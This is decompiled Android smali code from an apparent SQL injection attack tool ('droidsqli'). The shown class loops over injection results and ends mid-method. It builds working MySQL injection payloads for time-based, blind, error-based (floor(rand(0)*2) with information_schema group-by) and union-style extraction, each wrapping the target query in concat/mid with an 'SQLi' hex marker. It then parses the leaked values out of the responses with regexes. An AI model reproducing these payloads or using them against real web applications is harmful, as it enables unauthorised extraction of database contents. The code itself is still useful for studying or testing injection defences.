.class Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;
.super Lnet/edgard/droidsqli/mvc/model/Stoppable;
.source "InjectionModel.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lnet/edgard/droidsqli/mvc/model/InjectionModel;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "Stoppable_loopIntoResults"
.end annotation


# instance fields
.field final synthetic this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;


# direct methods
.method public constructor <init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V
    .locals 0
    .param p2, "model"    # Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .prologue
    .line 1064
    iput-object p1, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .line 1065
    invoke-direct {p0, p2}, Lnet/edgard/droidsqli/mvc/model/Stoppable;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    .line 1066
    return-void
.end method

.method public constructor <init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V
    .locals 0
    .param p2, "model"    # Lnet/edgard/droidsqli/mvc/model/InjectionModel;
    .param p3, "interruptable"    # Lnet/edgard/droidsqli/mvc/model/Interruptable;

    .prologue
    .line 1067
    iput-object p1, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .line 1068
    invoke-direct {p0, p2, p3}, Lnet/edgard/droidsqli/mvc/model/Stoppable;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V

    .line 1069
    return-void
.end method


# virtual methods
.method public varargs action([Ljava/lang/Object;)Ljava/lang/String;
    .locals 24
    .param p1, "args"    # [Ljava/lang/Object;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    .line 1073
    const/16 v18, 0x0

    aget-object v7, p1, v18

    check-cast v7, Ljava/lang/String;

    .line 1074
    .local v7, "initialSQLQuery":Ljava/lang/String;
    const/16 v18, 0x1

    aget-object v14, p1, v18

    check-cast v14, [Ljava/lang/String;

    .line 1075
    .local v14, "sourcePage":[Ljava/lang/String;
    const/16 v18, 0x2

    aget-object v18, p1, v18

    check-cast v18, Ljava/lang/Boolean;

    invoke-virtual/range {v18 .. v18}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v17

    .line 1076
    .local v17, "useLimit":Z
    const/16 v18, 0x3

    aget-object v18, p1, v18

    check-cast v18, Ljava/lang/Integer;

    invoke-virtual/range {v18 .. v18}, Ljava/lang/Integer;->intValue()I

    move-result v10

    .line 1077
    .local v10, "numberToFind":I
    const/16 v18, 0x4

    aget-object v13, p1, v18

    check-cast v13, Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;

    .line 1079
    .local v13, "searchName":Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;
    new-instance v18, Ljava/lang/String;

    move-object/from16 v0, v18

    invoke-direct {v0, v7}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    const-string v19, "\\{limit\\}"

    const-string v20, ""

    invoke-virtual/range {v18 .. v20}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 1086
    .local v15, "sqlQuery":Ljava/lang/String;
    const-string v6, ""

    .local v6, "finalResultSource":Ljava/lang/String;
    const-string v4, ""

    .line 1087
    .local v4, "currentResultSource":Ljava/lang/String;
    const/4 v8, 0x0

    .local v8, "limitSQLResult":I
    const/16 v16, 0x1

    .line 1089
    .local v16, "startPosition":I
    :goto_0
    const-wide/16 v18, 0x64

    :try_start_0
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 1091
    :goto_1
    invoke-virtual/range {p0 .. p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->isPreparationStopped()Z

    move-result v18

    if-nez v18, :cond_0

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->interruptable:Lnet/edgard/droidsqli/mvc/model/Interruptable;

    move-object/from16 v18, v0

    if-eqz v18, :cond_1

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->interruptable:Lnet/edgard/droidsqli/mvc/model/Interruptable;

    move-object/from16 v18, v0

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/Interruptable;->isInterrupted()Z

    move-result v18

    if-eqz v18, :cond_1

    .line 1296
    :cond_0
    :goto_2
    return-object v6

    .line 1089
    :catch_0
    move-exception v5

    .local v5, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v5}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1

    .line 1093
    .end local v5    # "e":Ljava/lang/InterruptedException;
    :cond_1
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v18, v0

    move-object/from16 v0, v18

    iget-boolean v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useTimeBasedInjection:Z

    move/from16 v18, v0

    if-eqz v18, :cond_2

    .line 1094
    const/16 v18, 0x0

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->access$0(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;

    move-result-object v19

    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "(select+concat(0x53514c69,mid(("

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1099
    move-object/from16 v0, v20

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, "),"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1100
    move-object/from16 v0, v20

    move/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, ","

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1101
    const-string v21, "65536"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1102
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1103
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1104
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->interruptable:Lnet/edgard/droidsqli/mvc/model/Interruptable;

    move-object/from16 v21, v0

    .line 1094
    move-object/from16 v0, v19

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    move-object/from16 v3, p0

    invoke-virtual {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->inject(Ljava/lang/String;Lnet/edgard/droidsqli/mvc/model/Interruptable;Lnet/edgard/droidsqli/mvc/model/Stoppable;)Ljava/lang/String;

    move-result-object v19

    aput-object v19, v14, v18

    .line 1158
    :goto_3
    const-string v18, "SQLi([0-9A-Fghij]+)"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    const/16 v19, 0x0

    aget-object v19, v14, v19

    invoke-virtual/range {v18 .. v19}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v11

    .line 1165
    .local v11, "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v11}, Ljava/util/regex/Matcher;->find()Z

    move-result v18

    if-nez v18, :cond_5

    .line 1166
    if-eqz v17, :cond_5

    const-string v18, ""

    move-object/from16 v0, v18

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_5

    .line 1169
    if-lez v10, :cond_0

    if-eqz v13, :cond_0

    .line 1170
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    const-string v20, "update-progressbar"

    const/16 v21, 0x2

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v21, v0

    const/16 v22, 0x0

    aput-object v13, v21, v22

    const/16 v22, 0x1

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v23

    aput-object v23, v21, v22

    invoke-direct/range {v18 .. v21}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_2

    .line 1105
    .end local v11    # "regexSearch":Ljava/util/regex/Matcher;
    :cond_2
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v18, v0

    move-object/from16 v0, v18

    iget-boolean v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useBlindInjection:Z

    move/from16 v18, v0

    if-eqz v18, :cond_3

    .line 1106
    const/16 v18, 0x0

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->access$1(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

    move-result-object v19

    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "(select+concat(0x53514c69,mid(("

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1111
    move-object/from16 v0, v20

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, "),"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1112
    move-object/from16 v0, v20

    move/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, ","

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1113
    const-string v21, "65536"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1114
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1115
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1116
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->interruptable:Lnet/edgard/droidsqli/mvc/model/Interruptable;

    move-object/from16 v21, v0

    .line 1106
    move-object/from16 v0, v19

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    move-object/from16 v3, p0

    invoke-virtual {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;->inject(Ljava/lang/String;Lnet/edgard/droidsqli/mvc/model/Interruptable;Lnet/edgard/droidsqli/mvc/model/Stoppable;)Ljava/lang/String;

    move-result-object v19

    aput-object v19, v14, v18

    goto/16 :goto_3

    .line 1117
    :cond_3
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v18, v0

    move-object/from16 v0, v18

    iget-boolean v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useErrorBasedInjection:Z

    move/from16 v18, v0

    if-eqz v18, :cond_4

    .line 1118
    const/16 v18, 0x0

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    .line 1119
    new-instance v20, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v21, v0

    move-object/from16 v0, v21

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v21, "+and"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1120
    const-string v21, "("

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1121
    const-string v21, "select+"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1122
    const-string v21, "1+"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1123
    const-string v21, "from("

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1124
    const-string v21, "select+"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1125
    const-string v21, "count(*),"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1126
    const-string v21, "concat("

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1127
    const-string v21, "0x53514c69,"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1128
    const-string v21, "mid("

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1129
    const-string v21, "("

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, "),"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1130
    move-object/from16 v0, v20

    move/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, ","

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1131
    const-string v21, "64"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1132
    const-string v21, "),"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1133
    const-string v21, "floor(rand(0)*2)"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1134
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1135
    const-string v21, "from+information_schema.tables+"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1136
    const-string v21, "group+by+2"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1137
    const-string v21, ")a"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1138
    const-string v21, ")--+"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1119
    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    .line 1118
    invoke-virtual/range {v19 .. v20}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inject(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    aput-object v19, v14, v18

    goto/16 :goto_3

    .line 1140
    :cond_4
    const/16 v18, 0x0

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    .line 1141
    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "select+concat(0x53514c69,mid(("

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1145
    move-object/from16 v0, v20

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, "),"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1146
    move-object/from16 v0, v20

    move/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, ","

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1147
    const-string v21, "65536"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1148
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1149
    const-string v21, ")"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    .line 1141
    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    .line 1150
    const/16 v21, 0x0

    .line 1151
    const/16 v22, 0x1

    .line 1140
    invoke-virtual/range {v19 .. v22}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inject(Ljava/lang/String;[Ljava/lang/String;Z)Ljava/lang/String;

    move-result-object v19

    aput-object v19, v14, v18

    goto/16 :goto_3

    .line 1180
    .restart local v11    # "regexSearch":Ljava/util/regex/Matcher;
    :cond_5
    :try_start_1
    new-instance v18, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v19, 0x1

    move/from16 v0, v19

    invoke-virtual {v11, v0}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 1181
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    const-string v20, "logs-message"

    new-instance v21, Ljava/lang/StringBuilder;

    const/16 v22, 0x1

    move/from16 v0, v22

    invoke-virtual {v11, v0}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v22

    invoke-static/range {v22 .. v22}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v22, " "

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v18 .. v21}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V
    :try_end_1
    .catch Ljava/lang/IllegalStateException; {:try_start_1 .. :try_end_1} :catch_1

    .line 1192
    const-string v18, "(h[0-9A-F]*jj[0-9A-F]*c?h)"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v4}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v11

    .line 1193
    const/4 v9, 0x0

    .line 1194
    .local v9, "nbResult":I
    :goto_4
    invoke-virtual {v11}, Ljava/util/regex/Matcher;->find()Z

    move-result v18

    if-nez v18, :cond_a

    .line 1201
    if-eqz v17, :cond_6

    .line 1202
    if-lez v10, :cond_6

    if-eqz v13, :cond_6

    .line 1203
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    const-string v20, "update-progressbar"

    const/16 v21, 0x2

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v21, v0

    const/16 v22, 0x0

    aput-object v13, v21, v22

    const/16 v22, 0x1

    add-int v23, v8, v9

    invoke-static/range {v23 .. v23}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v23

    aput-object v23, v21, v22

    invoke-direct/range {v18 .. v21}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1213
    :cond_6
    const-string v18, "i"

    move-object/from16 v0, v18

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v18

    if-eqz v18, :cond_10

    .line 1218
    new-instance v18, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v19, "i.*"

    const/16 v20, 0x22

    invoke-static/range {v19 .. v20}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v19

    move-object/from16 v0, v19

    invoke-virtual {v0, v4}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v19

    const-string v20, ""

    invoke-virtual/range {v19 .. v20}, Ljava/util/regex/Matcher;->replaceAll(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, v18

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 1219
    if-eqz v17, :cond_f

    .line 1225
    const-string v18, "(gh+|j+\\d*)$"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v6}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v18

    const-string v19, ""

    invoke-virtual/range {v18 .. v19}, Ljava/util/regex/Matcher;->replaceAll(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1226
    const-string v18, "(gh+|j+\\d*)$"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v4}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v18

    const-string v19, ""

    invoke-virtual/range {v18 .. v19}, Ljava/util/regex/Matcher;->replaceAll(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 1231
    const-string v18, "[0-9A-F]hhgghh[0-9A-F]+$"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v4}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v11

    .line 1232
    const-string v18, "h[0-9A-F]+$"

    const/16 v19, 0x22

    invoke-static/range {v18 .. v19}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

